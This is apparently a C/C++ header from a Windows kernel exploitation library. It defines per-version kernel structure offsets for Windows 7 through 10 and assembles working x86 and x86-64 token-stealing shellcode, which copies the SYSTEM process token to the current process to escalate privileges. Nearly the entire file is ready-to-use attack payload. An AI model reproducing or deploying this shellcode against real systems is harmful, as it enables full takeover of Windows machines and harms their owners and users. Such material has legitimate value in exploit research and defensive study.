#pragma once

#include "common.h"



#if defined(__WIN10__)

#if defined(_WIN64)
#define KIINITIAL_THREAD  "\x88\x01"
#define EPROCESS_OFFSET   "\xb8\x00"
#define PROCESSID_OFFSET  "\xe0\x02"
#define FLINK_OFFSET      "\xe8\x02"
#define TOKEN_OFFSET      "\x58\x03"
#define SYSTEM_PID        "\x04"

#else
#define USE_DEFAULT_SHELLCODE 1
#endif

#elif defined(__WIN8__)

#if defined(_WIN64)
#define KIINITIAL_THREAD  "\x88\x01"
#define EPROCESS_OFFSET   "\xb8\x00"
#define PROCESSID_OFFSET  "\xe0\x02"
#define FLINK_OFFSET      "\xe8\x02"
#define TOKEN_OFFSET      "\x48\x03"
#define SYSTEM_PID        "\x04"

#else
#define KTHREAD_OFFSET    "\x24\x01"   // 0x0124
#define EPROCESS_OFFSET   "\x50\x01"   // 0x150
#define PID_OFFSET        "\xb4\x00"   // 0x00b4
#define FLINK_OFFSET      "\xb8\x00"   // 0x00b8
#define TOKEN_OFFSET      "\xec\x00"   // 0x00ec
#define SYSTEM_PID        "\x04"       // 0x04

#endif

#elif defined(__WIN81__)

#if defined(_WIN64)
#define KIINITIAL_THREAD  "\x88\x01"  // 0x0188
#define EPROCESS_OFFSET   "\xb8\x00"  // 0x00b8
#define PROCESSID_OFFSET  "\xe0\x02"  // 0x02e0
#define FLINK_OFFSET      "\xe8\x02"  // 0x02e8
#define TOKEN_OFFSET      "\x48\x03"  // 0x0348
#define SYSTEM_PID        "\x04"      // 0x0004

#else
#define KTHREAD_OFFSET    "\x24\x01"   // 0x0124
#define EPROCESS_OFFSET   "\x50\x01"   // 0x150
#define PID_OFFSET        "\xb4\x00"   // 0x00b4
#define FLINK_OFFSET      "\xb8\x00"   // 0x00b8
#define TOKEN_OFFSET      "\xec\x00"   // 0x00ec
#define SYSTEM_PID        "\x04"       // 0x04

#endif

#elif defined(__WIN7SP1__)

#if defined(_WIN64)
#pragma message "Compiling " __FILE__ " for Windows 7 SP1 (x86-64)"
#warning "No architecture specified for shellcode for Windows 7 SP1, use default shellcode...."
#define USE_DEFAULT_SHELLCODE 1

#else
#define KTHREAD_OFFSET    "\x24\x01"   // 0x0124
#define EPROCESS_OFFSET   "\x50"       // 0x50
#define PID_OFFSET        "\xb4\x00"   // 0x00B4
#define FLINK_OFFSET      "\xb8\x00"   // 0x00B8
#define TOKEN_OFFSET      "\xf8\x00"   // 0x00F8
#define SYSTEM_PID        "\x04"       // 0x04

#endif

#else

#define USE_DEFAULT_SHELLCODE 1

#endif


/**
 * Shellcode source: https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27
 */

#if defined(USE_DEFAULT_SHELLCODE)
const uint8_t StealTokenShellcode[] = { 0x90, 0x90, 0x90, 0x90, 0xcc, 0xcc, 0xcc, 0xcc };
#else
const uint8_t StealTokenShellcode[] = ""
#if defined(__x86_64__)
"\x50"                                                      // push rax
"\x53"                                                      // push rbx
"\x51"                                                      // push rcx
"\x65\x48\x8b\x04\x25" KIINITIAL_THREAD "\x00\x00"          // mov rax, gs:[KIINITIAL_THREAD]
"\x48\x8b\x80" EPROCESS_OFFSET "\x00\x00"                   // mov rax, [rax+EPROCESS_OFFSET]
"\x48\x89\xc3"                                              // mov rbx, rax
"\x48\x8b\x9b" FLINK_OFFSET "\x00\x00"                      // mov rbx, [rbx+FLINK_OFFSET]
"\x48\x81\xeb" FLINK_OFFSET "\x00\x00"                      // sub rbx, FLINK_OFFSET
"\x48\x8b\x8b" PROCESSID_OFFSET "\x00\x00"                  // mov rcx, [rbx+PROCESSID_OFFSET]
"\x48\x83\xf9" SYSTEM_PID                                   // cmp rcx, SYSTEM_PID
"\x75\xe5"                                                  // jnz -0x19
"\x48\x8b\x8b" TOKEN_OFFSET "\x00\x00"                      // mov rcx, [rbx + TOKEN_OFFSET]
"\x80\xe1\xf0"                                              // and cl, 0xf0
"\x48\x89\x88" TOKEN_OFFSET "\x00\x00"                      // mov [rax + TOKEN_OFFSET], rcx
"\x59"                                                      // pop rcx
"\x5b"                                                      // pop rbx
"\x58"                                                      // pop rax
#ifdef __ALIGN_STACK__
"\x48\x83\xc4\x28"                                          // add rsp, 0x28
#endif
"\x48\x31\xc0"                                              // xor rax, rax
"\xc3"                                                      // ret

#elif defined(__x86_32__)
"\x60"                                                      // pushad
"\x64\xa1" KTHREAD_OFFSET  "\x00\x00"                       // mov eax, fs:[KTHREAD_OFFSET]
"\x8b\x80" EPROCESS_OFFSET "\x00\x00"                       // mov eax, [eax + EPROCESS_OFFSET]
"\x89\xc1"                                                  // mov ecx, eax
"\x8b\x98" TOKEN_OFFSET "\x00\x00"                          // mov ebx, [eax + TOKEN_OFFSET]
"\xba" SYSTEM_PID "\x00\x00\x00"                            // mov edx, 4
"\x8b\x80"FLINK_OFFSET "\x00\x00"                           // mov eax, [eax + FLINK_OFFSET]
"\x2d" FLINK_OFFSET "\x00\x00"                              // sub eax, FLINK_OFFSET
"\x39\x90" PID_OFFSET "\x00\x00"                            // cmp[eax + PID_OFFSET], edx
"\x75\xed"                                                  // jne -17
"\x8b\x90" TOKEN_OFFSET "\x00\x00"                          // mov edx, [eax + TOKEN_OFFSET]
"\x89\x91" TOKEN_OFFSET "\x00\x00"                          // mov[ecx + TOKEN_OFFSET], edx
"\x61"                                                      // popad
"\x31\xc0"                                                  // xor eax, eax

"\x5d"                                                      // pop ebp
"\xc2\x08\x00"                                              // ret 8

#endif
"";

#endif

namespace pwn::kernel
{
	namespace shellcode
	{
		PWNAPI std::vector<BOOL> steal_system_token(void);
	}
}

